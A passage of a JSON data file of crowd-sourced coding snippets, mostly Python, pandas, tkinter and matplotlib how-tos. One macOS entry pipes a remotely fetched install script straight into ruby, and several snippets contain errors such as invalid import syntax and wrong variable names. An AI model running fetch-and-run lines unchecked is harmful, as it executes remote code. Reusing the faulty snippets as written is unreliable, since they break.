False}\nsklearn.linear_model.LogisticRegression\n# import the metrics class from sklearn import metrics cnf_matrix = metrics.confusion_matrix(y_test, y_pred) cnf_matrix \nprint(\"j\")\n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2289,
    "keyword": null,
    "link": null,
    "title": " logout in discord.py",
    "description": "Client.logout() --------or---------- Client.save()\n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2290,
    "keyword": null,
    "link": null,
    "title": " look through dict",
    "description": "for key, value in d.items(): \t...  for key in d.keys(): \t...  for value in d.values(): \t...\n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2291,
    "keyword": null,
    "link": null,
    "title": " ls.ProgrammingError: permission denied for table django migrations",
    "description": "psql mydatabase -c \"GRANT ALL ON ALL TABLES IN SCHEMA public to dbuser;\" psql mydatabase -c \"GRANT ALL ON ALL SEQUENCES IN SCHEMA public to dbuser;\" psql mydatabase -c \"GRANT ALL ON ALL FUNCTIONS IN SCHEMA public to dbuser;\"\n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2292,
    "keyword": null,
    "link": null,
    "title": " lua hello world",
    "description": "print(\"Hello World\") print 'Hello World'\t\t-- one line strings don't need ()\nprint(\"Hello World\")\nprint(\"Hi\") --prints hi\nio.write(\"Hello World\")\nprint(\"Hi\") -- You Can Also Print Variable i.e;  A = 1 print(A)\n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2293,
    "keyword": null,
    "link": null,
    "title": " mac install python 3.8",
    "description": "brew install python@3.8\nbrew install python3 brew install python2\n$ brew switch python 3.6.5_1 \n$ brew switch python 3.7.4_1 \n$ brew install --ignore-dependencies https://raw.githubusercontent.com/Homebrew/homebrew-core/f2a764ef944b1080be64bd88dca9a1d80130c558/Formula/python.rb \n$ ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\" \n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2294,
    "keyword": null,
    "link": null,
    "title": " mac upgrade python to 3.8",
    "description": "brew install python3 brew update && brew upgrade python alias python=/usr/local/bin/python3\n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2295,
    "keyword": null,
    "link": null,
    "title": " mailchimp send email python",
    "description": "from mailchimp import Mailchimp mailchimp = Mailchimp(api_key) mailchimp.campaigns.send(campaign_id) \n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2296,
    "keyword": null,
    "link": null,
    "title": " main.pas(1,18) Fatal: Syntax error, \";\" expected but \"identifier UTILIZADO\" found",
    "description": "main.pas(1,18) Fatal: Syntax error, \";\" expected but \"identifier UTILIZADO\" found\n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2297,
    "keyword": null,
    "link": null,
    "title": " main in python",
    "description": "def main():     print(\"Hello World!\")  if __name__ == \"__main__\":     main()\nif __name__ == \"__main__\":\n# Defining main function  def main():      print(\"hello World\")        # Using the special variable   # __name__  if __name__==\"__main__\":      main() \n print(\"Hello\")  print(\"__name__ value: \", __name__)   def main():     print(\"python main function\")   if __name__ == '__main__':     main() \nif __name__ == \"__main__\":     # execute only if run as a script     main() \n",
    "reg_date": "2021-10-12T11:31:31.000Z"
  },
  {
    "id": 2298,
    "keyword": null,
    "link": null,
    "title": " make a message appear after specified Time python",
    "description": "import time  print(\"Printed immediately.\") time.sleep(2.4) print(\"Print after 24 Seconds\") \n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2299,
    "keyword": null,
    "link": null,
    "title": " make a pop up window in python",
    "description": "from tkinter import *  def alert_popup(title, message, path):     \"\"\"Generate a pop-up window for special messages.\"\"\"     root = Tk()     root.title(title)     w = 400     # popup window width     h = 200     # popup window height     sw = root.winfo_screenwidth()     sh = root.winfo_screenheight()     x = (sw - w)/2     y = (sh - h)/2     root.geometry('%dx%d+%d+%d' % (w, h, x, y))     m = message     m += '\\n'     m += path     w = Label(root, text=m, width=120, height=10)     w.pack()     b = Button(root, text=\"OK\", command=root.destroy, width=10)     b.pack()     mainloop()\nimport tkinter as tk  def popupmsg(msg, title):     root = tk.Tk()     root.title(title)     label = ttk.Label(root, text=msg)     label.pack(side=\"top\", fill=\"x\", pady=10)     B1 = tk.Button(root, text=\"Okay\", command = root.destroy)     B1.pack()     popup.mainloop()\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2300,
    "keyword": null,
    "link": null,
    "title": " make a zero list python",
    "description": "listofzeros = [0] * n\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2301,
    "keyword": null,
    "link": null,
    "title": " make beep python",
    "description": "import winsound frequency = 2500  # Set Frequency To 2500 Hertz duration = 1000  # Set Duration To 1000 ms == 1 second winsound.Beep(frequency, duration)\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2302,
    "keyword": null,
    "link": null,
    "title": " make dictionary from text file python",
    "description": "d = {} with open(\"file.txt\") as f:     for line in f:        (key, val) = line.split()        d[int(key)] = val\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2303,
    "keyword": null,
    "link": null,
    "title": " make each element in a list occur once python",
    "description": "for i in my_list: \tif i in corrected_list: \t\tcontinue \telse: \t\tcorrected_list.append(i)\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2304,
    "keyword": null,
    "link": null,
    "title": " make first row columns pandas",
    "description": "new_header = df.iloc[0] #grab the first row for the header df = df[1:] #take the data less the header row df.columns = new_header #set the header row as the df header\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2305,
    "keyword": null,
    "link": null,
    "title": " make jupyter notebook wider",
    "description": "from IPython.core.display import display, HTML display(HTML(\"<style>.container { width:100% !important; }</style>\"))\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2306,
    "keyword": null,
    "link": null,
    "title": " make length string in pandas",
    "description": "df['name_length'] = df.Name.str.len()   // or   df['name_length'] = df.Name.apply(len)\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2307,
    "keyword": null,
    "link": null,
    "title": " make new app folder in django templates dir",
    "description": "#settings.py TEMPLATES = [     {         ...         'DIRS': [os.path.join(BASE_DIR, 'templates'),                  os.path.join(BASE_DIR, 'templates', 'the_folder_you_created'),                 ...                 ]     } ]\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2308,
    "keyword": null,
    "link": null,
    "title": " make pandas df from np array",
    "description": "numpy_data = np.array([[1, 2], [3, 4]]) df = pd.DataFrame(data=numpy_data, index=[\"row1\", \"row2\"], columns=[\"column1\", \"column2\"]) print(df) >>>   column1  column2 row1        1        2 row2        3        4\nnumpy_data = np.array([[1, 2], [3, 4]]) df = pd.DataFrame(data=numpy_data, index=[\"row1\", \"row2\"], columns=[\"column1\", \"column2\"]) print(df)\n",
    "reg_date": "2021-10-12T11:31:32.000Z"
  },
  {
    "id": 2309,
    "keyword": null,
    "link": null,
    "title": " make python look good",
    "description": "#Pretty python input in console def prettyPrint():   print(\"Enter your name\")   userName = str(input(\"> \"))   print(\"\\nHello \" + userName) prettyPrint()\n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2310,
    "keyword": null,
    "link": null,
    "title": " make python use python3",
    "description": "sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 10\nalias python=python3 \n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2311,
    "keyword": null,
    "link": null,
    "title": " make string numeric pandas",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].astype(int) \ndf['DataFrame Column'] = df['DataFrame Column'].astype(float) \ndf['DataFrame Column'] = pd.to_numeric(df['DataFrame Column']) \n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2312,
    "keyword": null,
    "link": null,
    "title": " make tkinter btn disable",
    "description": "btn1['state'] = 'normal' btn1['state'] = 'disabled'\n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2313,
    "keyword": null,
    "link": null,
    "title": " make tkinter button disable",
    "description": "btn1['state'] = 'normal' btn1['state'] = 'disabled'\nbutton['state'] = 'disabled'\n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2314,
    "keyword": null,
    "link": null,
    "title": " make y axis start at 0 python",
    "description": "ax.set_ylim(ymin=0)\n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2315,
    "keyword": null,
    "link": null,
    "title": " making a student admission program in python",
    "description": "#reader from tkinter import * import time  Student_forum = Tk() Roll_no_ask = Label(Student_forum,text=\"Roll no of the student\") Roll_no_ask.pack() Roll_no = Entry() Roll_no.pack()   def submit():     get_data = open(\"student_details.txt\",\"r\")     get_data2 = get_data.read()     if Roll_no.get() in get_data2:         Label1 = Label(Student_forum,text=\"Fetching data......\")         Label1.pack()         print(get_data2)         time.sleep(3)          lable2 = Label(Student_forum,text=\"So please check your name in the list\")         lable2.pack()         Screen_render = Label(Student_forum,text=get_data2)         Screen_render.pack()     else:         error_on_screen = Label(text=\"No student has this Roll no\")         error_on_screen.pack() Button = Button(Student_forum,text=\"Submit Form\",command=submit) Button.pack()  Student_forum.mainloop()\n#adder from tkinter import * import time Student_forum=Tk() Student_forum.title(\"student form\") Student_forum.geometry('390x400')  Roll_ask = Label(Student_forum,text=\"Roll Number\") Roll_ask.pack() Roll = Entry() Roll.pack()  name_ask = Label(Student_forum,text = \"Name\") name_ask.pack() Name = Entry(Student_forum) Name.pack()  age_ask = Label(Student_forum,text = \"Age\") age_ask.pack() age = Entry() age.pack() get_data = open(\"student_details.txt\",\"a+\") def submit():     if Roll.get() == \"\":         error = Label(Student_forum,text = \"Please fill Roll section roll section can't remain blank\")         error.pack()     elif Name.get() == \"\":         error2 = Label(Student_forum ,text=\"Please fill your name in name section it  can't e remain blank\")          error2.pack()     elif age.get() == \"\":         error3 = Label(Student_forum,text=\"fill age section first\")         error3.pack()     else:         get_data = open(\"student_details.txt\",\"r\")         get_data2 = get_data.read()         if Roll.get() in get_data2:             Label2 = Label(Student_forum,text=\"You are already added in the list\")             Label2.pack()         else:             steps = \"Your name is \" + Name.get() + \" and your age is \" + age.get()              submit_out = Label(Student_forum,text = steps)             submit_out.pack()             txt_file = open(\"student_details.txt\",\"a+\")             txt_file.writelines(str((\"Roll number=\"+Roll.get()+\" Name= \"+Name.get()+\" Age=\"+age.get()+\"\\n\")))             txt_file.close()             do = Label(Student_forum,text=\"Now you are added in the list of students\")             do.pack()              def clear():     Roll.delete(0,\"end\")     Name.delete(0,\"end\")     age.delete(0,\"end\") Button1 = Button(Student_forum,text=\"Submit Form\",command=submit) Button1.pack() Button2 = Button(Student_forum,text=\"Clear\",command=clear) Button2.pack()      Student_forum.mainloop() \n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2316,
    "keyword": null,
    "link": null,
    "title": " making constructor in python",
    "description": "class User:     def __init__(self, user_id, user_name):         self.user_id = user_id         self.user_name = user_name User1 = User(4383,\"Empire of programmers\") print(User1.user_id) print(User1.user_name)\n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2317,
    "keyword": null,
    "link": null,
    "title": " making hexagon in python turtle",
    "description": "import turtle   polygon = turtle.Turtle()  num_sides = 6 side_length = 70 angle = 360.0 / num_sides   for i in range(num_sides):     polygon.forward(side_length)     polygon.right(angle)     \n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2318,
    "keyword": null,
    "link": null,
    "title": " making log files in python",
    "description": "import logging logging.basicConfig(filename='example.log', encoding='utf-8', level=logging.DEBUG) logging.debug('This is debug message') logging.info('This is information message') logging.warning('This is warning message') logging.error('This is warning message')\nlogging.basicConfig(filename=\"logfilename.log\", level=logging.INFO) # Log Creation  logging.info('your text goes here') logging.error('your text goes here') logging.debug('your text goes here') \n# logging_example.py  import logging  # Create a custom logger logger = logging.getLogger(__name__)  # Create handlers c_handler = logging.StreamHandler() f_handler = logging.FileHandler('file.log') c_handler.setLevel(logging.WARNING) f_handler.setLevel(logging.ERROR)  # Create formatters and add it to handlers c_format = logging.Formatter('%(name)s - %(levelname)s - %(message)s') f_format = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s') c_handler.setFormatter(c_format) f_handler.setFormatter(f_format)  # Add handlers to the logger logger.addHandler(c_handler) logger.addHandler(f_handler)  logger.warning('This is a warning') logger.error('This is an error') \nimport logging logging.basicConfig(filename='example.log', encoding='utf-8', level=logging.DEBUG) logging.debug('This message should go to the log file') logging.info('So should this') logging.warning('And this, too') logging.error('And non-ASCII stuff, too, like &Oslash;resund and Malm&ouml;') \n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2319,
    "keyword": null,
    "link": null,
    "title": " making variable if it is none python",
    "description": "var = None if var == None:     var = \"\"     print(var)\n>>> NoneType = type(None) >>> x = None >>> type(x) == NoneType True >>> isinstance(x, NoneType) True\n",
    "reg_date": "2021-10-12T11:31:33.000Z"
  },
  {
    "id": 2320,
    "keyword": null,
    "link": null,
    "title": " matplotlib.pyplot imshow size",
    "description": "from matplotlib import pyplot as plt  plt.figure(figsize = (20,2)) plt.imshow(random.rand(8, 90), interpolation='nearest')\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2321,
    "keyword": null,
    "link": null,
    "title": " matplotlib 3.0.3 wheel file",
    "description": "pip install matplotlib\npip install matplotlib==3.0.3\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2322,
    "keyword": null,
    "link": null,
    "title": " matplotlib 3D plots reduce margins",
    "description": "import matplotlib.pyplot as plt plt.subplots_adjust(left=0, right=1, top=1, bottom=0)\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2323,
    "keyword": null,
    "link": null,
    "title": " matplotlib add space between subplots",
    "description": "import matplotlib.pyplot as plt matplotlib.pyplot.subplots_adjust(wspace=X, hspace=Y) # Adjust X for width between subplots # Adjust Y for height between subplots\nimport matplotlib.pyplot as plt  fig, axes = plt.subplots(nrows=4, ncols=4) fig.tight_layout() # Or equivalently,  \"plt.tight_layout()\"  plt.show()\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2324,
    "keyword": null,
    "link": null,
    "title": " matplotlib axes labels",
    "description": "import matplotlib.pyplot as plt  plt.ylabel('Y AXIS') plt.xlabel('X AXIS')\nfig = plt.figure() ax = fig.add_subplot(...)  ax.set_title('Title Here')  ax.set_xlabel('x label here') ax.set_ylabel('y label here') ax.set_zlabel('z label here')\nticks = [0, 1, 2] labels = [\"a\", \"b\", \"c\"]  plt.figure() plt.xticks(ticks, labels) plt.show()\nax2.set_xlabel('time (s)')\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2325,
    "keyword": null,
    "link": null,
    "title": " matplotlib axes limits",
    "description": "axes.set_xlim([xmin, xmax]) axes.set_ylim([ymin, ymax])\naxes.set_xlim([xmin, xmax]) axes.set_ylim([ymin, ymax]) axes.set_zlim([zmin, zmax])\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2326,
    "keyword": null,
    "link": null,
    "title": " matplotlib axis rotate xticks",
    "description": "ax.tick_params(axis='x', rotation=45)\nxticks(rotation=45) # rotate x-axis labels by 45 degrees. yticks(rotation=90) # rotate y-axis labels by 90 degrees.\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2327,
    "keyword": null,
    "link": null,
    "title": " matplotlib background color",
    "description": "fig, ax = plt.subplots() #to change the inside of the graph ax.set_facecolor('xkcd:salmon') ax.set_facecolor((1.0, 0.47, 0.42)) #to change the border color around the back fig.patch.set_facecolor('xkcd:mint green')\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2328,
    "keyword": null,
    "link": null,
    "title": " matplotlib change bar color under threshold",
    "description": "import numpy as np import matplotlib.pyplot as plt  fig = plt.figure() ax = fig.add_subplot(111)  N = 5 ind = np.arange(N) width = 0.5 vals = [1,2,3,4,5] colors = ['r','b','b','b','b'] ax.barh(ind, vals, width, color=colors)  plt.show()\n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2329,
    "keyword": null,
    "link": null,
    "title": " matplotlib change font",
    "description": "from matplotlib import rc font = {'size'   : 16} matplotlib.rc('font', **font)  # change font matplotlib.rcParams['font.sans-serif'] = \"Arial\" matplotlib.rcParams['font.family'] = \"sans-serif\" \n",
    "reg_date": "2021-10-12T11:31:34.000Z"
  },
  {
    "id": 2330,
    "keyword": null,
    "link": null,
    "title": " matplotlib change text size",
    "description": "import matplotlib.pyplot as plt plt.rcParams.update({'font.size': 22})\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2331,
    "keyword": null,
    "link": null,
    "title": " matplotlib change thickness of line",
    "description": "ax.plot(x, y1, c='b', label='y1',linewidth=7.0)\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2332,
    "keyword": null,
    "link": null,
    "title": " matplotlib dark mode",
    "description": "import matplotlib.pyplot as plt  plt.style.use('dark_background') \n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2333,
    "keyword": null,
    "link": null,
    "title": " matplotlib does not support generators as input",
    "description": "list or tuple should be appropriate input for matplotlib.  A fixed length generator can always be converted to a list.   vals_list = list(vals_generator) \n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2334,
    "keyword": null,
    "link": null,
    "title": " matplotlib histogram",
    "description": "import matplotlib.pyplot as plt data = [1.7,1.8,2.0,2.2,2.2,2.3,2.4,2.5,2.5,2.5,2.6,2.6,2.8,         2.9,3.0,3.1,3.1,3.2,3.3,3.5,3.6,3.7,4.1,4.1,4.2,4.3] #this histogram has a range from 1 to 4 #and 8 different bins plt.hist(data, range=(1,4), bins=8) plt.show()\nimport matplotlib.pyplot as plt   x = [1,1,2,3,3,5,7,8,9,10,      10,11,11,13,13,15,16,17,18,18,      18,19,20,21,21,23,24,24,25,25,      25,25,26,26,26,27,27,27,27,27,      29,30,30,31,33,34,34,34,35,36,      36,37,37,38,38,39,40,41,41,42,      43,44,45,45,46,47,48,48,49,50,      51,52,53,54,55,55,56,57,58,60,      61,63,64,65,66,68,70,71,72,74,      75,77,81,83,84,87,89,90,90,91      ]  plt.hist(x, bins=10) plt.show() \nimport matplotlib.pyplot as plt\t   \tdata = [1.7,1.8,2.0,2.2,2.2,2.3,2.4,2.5,2.5,2.5,2.6,2.6,2.8,     2.9,3.0,3.1,3.1,3.2,3.3,3.5,3.6,3.7,4.1,4.1,4.2,4.3]   \tplt.hist(data)     plt.title('Histogram of Data')     plt.xlabel('data')     plt.ylabel('count')\n# Import packages import matplotlib.pyplot as plt %matplotlib inline  # Create the plot fig, ax = plt.subplots()  # Plot the histogram with hist() function ax.hist(x, edgecolor = \"black\", bins = 5)  # Label axes and set title ax.set_title(\"Title\") ax.set_xlabel(\"X_Label\") ax.set_ylabel(\"Y_Label\")\nimport pyplot from matplotlib as plt plt.hist(x_axis_list, y_axis_list)\nimport pyplot from matplotlib as plt plt.hist(x, bins=None, range=None, density=False, weights=None, cumulative=False, bottom=None, histtype='bar', align='mid', orientation='vertical', rwidth=None, log=False, color=None, label=None, stacked=False, *, data=None, **kwargs)\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2335,
    "keyword": null,
    "link": null,
    "title": " matplotlib insert text",
    "description": "import matplotlib.pyplot as plt fig, ax = plt.subplots() textstr = \"Test\" ax.text(0.05, 0.95, textstr, transform=ax.transAxes, fontsize=14,         verticalalignment='top')\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2336,
    "keyword": null,
    "link": null,
    "title": " matplotlib install",
    "description": "pip install matplotlib\nsudo apt install python3-matplotlib\npip3 install matplotlib\n// install matplotlib  pip install matplotlib  // using conda  conda install -c conda-forge matplotlib \nfirst add pypy and its scripts folder to path! then use the following code in terminal:  pypy3 -m pip install matplotlib  do not worry if it looked stuck at the end.\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2337,
    "keyword": null,
    "link": null,
    "title": " matplotlib label axis",
    "description": "# Basic syntax: plt.xlabel(\"X axis label\") # Add \", fontsize = #\" to control fontsize plt.ylabel(\"Y axis label\")  # Example usage: plt.plot(range(5)) plt.xlabel(\"X axis label\") plt.ylabel(\"Y axis label\") plt.title(\"Figure title\", fontsize = 20)  # Note, xlabel and ylabel come from matplotlib.pyplot and plt is an  # \tabbreviation for this, e.g. import matplotlib.pyplot as plt\nimport matplotlib.pyplot as plt  plt.ylabel('Y AXIS') plt.xlabel('X AXIS')\nfig = plt.figure() ax = fig.add_subplot(...)  ax.set_title('Title Here')  ax.set_xlabel('x label here') ax.set_ylabel('y label here') ax.set_zlabel('z label here')\nax2.set_xlabel('time (s)')\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2338,
    "keyword": null,
    "link": null,
    "title": " matplotlib latex non italic indices",
    "description": "plt.xlabel(r'Primary T$_{\\rm eff}$')\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2339,
    "keyword": null,
    "link": null,
    "title": " matplotlib legend",
    "description": "import numpy as np import matplotlib.pyplot as plt  x = np.linspace(0, 20, 1000) y1 = np.sin(x) y2 = np.cos(x)  plt.plot(x, y1, \"-b\", label=\"sine\") plt.plot(x, y2, \"-r\", label=\"cosine\") plt.legend(loc=\"upper left\") plt.ylim(-1.5, 2.0) plt.show()\nax.legend(loc='upper center', bbox_to_anchor=(0.5, 1.05),           ncol=3, fancybox=True, shadow=True)\nplt.legend(loc='upper right')\nplt.legend(['first', 'second']);\n import matplotlib.pyplot as plt  #define x and ysin plt.plot(x,ysin,label='sin(x)') plt.legend() plt.show() \n# Short answer: # matplotlib.pyplot places the legend in the \"best\" location by default # To add a legend to your plot, call plt.legend()  # Example usage: import matplotlib.pyplot as plt x1 = [1, 2, 3] # Invent x and y data to be plotted y1 = [4, 5, 6] x2 = [1, 3, 5] y2 = [6, 5, 4]  plt.plot(x1, y1, label=\"Dataset_1\") # Use label=\"data_name\" so that the  \t\t\t\t\t\t\t\t\t# legend is easy to interpret plt.plot(x2, y2, label=\"Dataset_2\") plt.legend(loc='best') plt.show()  # Other legend locations you can specify: Location String\t\tLocation Code (e.g. loc=1) 'best'\t\t\t\t0 'upper right'\t\t1 'upper left'\t\t2 'lower left'\t\t3 'lower right'\t\t4 'right'\t\t\t\t5 'center left'\t\t6 'center right'\t\t7 'lower center'\t\t8 'upper center'\t\t9 'center'\t\t\t10\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2340,
    "keyword": null,
    "link": null,
    "title": " matplotlib legend out of plot",
    "description": "import numpy as np import matplotlib.pyplot as plt  x = np.linspace(0, 20, 1000) y1 = np.sin(x) y2 = np.cos(x)  plt.plot(x, y1, \"-b\", label=\"sine\") plt.plot(x, y2, \"-r\", label=\"cosine\") plt.legend(loc=\"upper left\") plt.ylim(-1.5, 2.0) plt.show()\nax.legend(loc='upper center', bbox_to_anchor=(0.5, 1.05),           ncol=3, fancybox=True, shadow=True)\n",
    "reg_date": "2021-10-12T11:31:35.000Z"
  },
  {
    "id": 2341,
    "keyword": null,
    "link": null,
    "title": " matplotlib log",
    "description": "plt.yscale('log')\nimport pylab import matplotlib.pyplot as plt a = [pow(10, i) for i in range(10)] fig = plt.figure() ax = fig.add_subplot(2, 1, 1)  line, = ax.plot(a, color='blue', lw=2)  ax.set_yscale('log')  pylab.show()\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2342,
    "keyword": null,
    "link": null,
    "title": " matplotlib log2 xaxis",
    "description": "ax.set_xscale('log', basex=2) #or plt.xscale('log', basex=2)\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2343,
    "keyword": null,
    "link": null,
    "title": " matplotlib multiple plots with different size",
    "description": "import numpy as np import matplotlib.pyplot as plt   # generate some data x = np.arange(0, 10, 0.2) y = np.sin(x)  # plot it f, (a0, a1) = plt.subplots(1, 2, gridspec_kw={'width_ratios': [3, 1]}) a0.plot(x, y) a1.plot(y, x)  f.tight_layout() f.savefig('grid_figure.pdf')\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2344,
    "keyword": null,
    "link": null,
    "title": " matplotlib plot",
    "description": "from matplotlib import pyplot as plt  import matplotlib.pyplot as plt \nfrom matplotlib import pyplot as plt plt.plot([0, 1, 2, 3, 4, 5], [0, 1, 4, 9, 16, 25]) plt.show()\nimport matplotlib.pyplot as plt fig = plt.figure(1)\t#identifies the figure  plt.title(\"Y vs X\", fontsize='16')\t#title plt.plot([1, 2, 3, 4], [6,2,8,4])\t#plot the points plt.xlabel(\"X\",fontsize='13')\t#adds a label in the x axis plt.ylabel(\"Y\",fontsize='13')\t#adds a label in the y axis plt.legend(('YvsX'),loc='best')\t#creates a legend to identify the plot plt.savefig('Y_X.png')\t#saves the figure in the present directory plt.grid()\t#shows a grid under the plot plt.show()\nimport matplotlib.pyplot as plt plt.plot([1, 2, 3, 4], [1, 4, 9, 16]) plt.show()\nimport matplotlib.pylot as plt \n>>> rng = np.arange(50) >>> rnd = np.random.randint(0, 10, size=(3, rng.size)) >>> yrs = 1950 + rng  >>> fig, ax = plt.subplots(figsize=(5, 3)) >>> ax.stackplot(yrs, rng + rnd, labels=['Eastasia', 'Eurasia', 'Oceania']) >>> ax.set_title('Combined debt growth over time') >>> ax.legend(loc='upper left') >>> ax.set_ylabel('Total debt') >>> ax.set_xlim(xmin=yrs[0], xmax=yrs[-1]) >>> fig.tight_layout() \n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2345,
    "keyword": null,
    "link": null,
    "title": " matplotlib plot adjust margins",
    "description": "import matplotlib.pyplot as plt plt.subplots_adjust(left=0, right=1, top=1, bottom=0)\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2346,
    "keyword": null,
    "link": null,
    "title": " matplotlib plot dashed",
    "description": "plot(x, y, color='green', linestyle='dashed', marker='o',      markerfacecolor='blue', markersize=12).\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2347,
    "keyword": null,
    "link": null,
    "title": " matplotlib plot remove margins",
    "description": "import matplotlib.pyplot as plt plt.subplots_adjust(left=0, right=1, top=1, bottom=0)\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2348,
    "keyword": null,
    "link": null,
    "title": " matplotlib plot title font size",
    "description": "from matplotlib import pyplot as plt      fig = plt.figure() plt.plot(data) fig.suptitle('test title', fontsize=20) plt.xlabel('xlabel', fontsize=18) plt.ylabel('ylabel', fontsize=16) fig.savefig('test.jpg')\nfont = {'family' : 'normal',         'weight' : 'bold',         'size'   : 22}  matplotlib.rc('font', **font)\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2349,
    "keyword": null,
    "link": null,
    "title": " matplotlib plot two graphs side by side",
    "description": "import matplotlib.pyplot as plt import numpy as np  # Simple data to display  x = np.linspace(0, 2 * np.pi, 400) y = np.sin(x ** 2)  # the container holding the two Axes have already been unpacked # useful if just few Axes have been created f, (ax1, ax2) = plt.subplots(1, 2)  ax1.plot(x, y) ax1.set_title('Left plot')  ax2.scatter(x, y) ax2.set_title('Right plot')  plt.tight_layout() plt.show()\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2350,
    "keyword": null,
    "link": null,
    "title": " matplotlib set size",
    "description": "    plt.figure(figsize=(20,8))\n",
    "reg_date": "2021-10-12T11:31:36.000Z"
  },
  {
    "id": 2351,
    "keyword": null,
    "link": null,
    "title": " matplotlib show imaginary numbers",
    "description": "cnums = np.arange(5) + 1j * np.arange(6,11) X = [x.real for x in cnums] Y = [x.imag for x in cnums] plt.scatter(X,Y, color='red') plt.show()\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2352,
    "keyword": null,
    "link": null,
    "title": " matplotlib space between subplots",
    "description": "import matplotlib.pyplot as plt matplotlib.pyplot.subplots_adjust(wspace=X, hspace=Y) # Adjust X for width between subplots # Adjust Y for height between subplots\nimport matplotlib.pyplot as plt  fig, axes = plt.subplots(nrows=4, ncols=4) fig.tight_layout(rect=[0, 0.03, 1, 0.95]) # Or equivalently, \"plt.tight_layout()\"  plt.show()\nleft  = 0.125  # the left side of the subplots of the figure right = 0.9    # the right side of the subplots of the figure bottom = 0.1   # the bottom of the subplots of the figure top = 0.9      # the top of the subplots of the figure wspace = 0.2   # the amount of width reserved for blank space between subplots hspace = 0.2   # the amount of height reserved for white space between subplots\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2353,
    "keyword": null,
    "link": null,
    "title": " matplotlib subplots title",
    "description": "fig.suptitle('This is a somewhat long figure title', fontsize=16)\nax[i].title.set_text('First Plot') plt.show()\nimport matplolib.pyplot as plt for i in range(4):     plt.subplot(2,2,i+1).set_title('Subplot n&deg;{}' .format(i+1)) plt.show()\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2354,
    "keyword": null,
    "link": null,
    "title": " matplotlib text too small",
    "description": "import matplotlib.pyplot as plt plt.rcParams.update({'font.size': 22})\n",
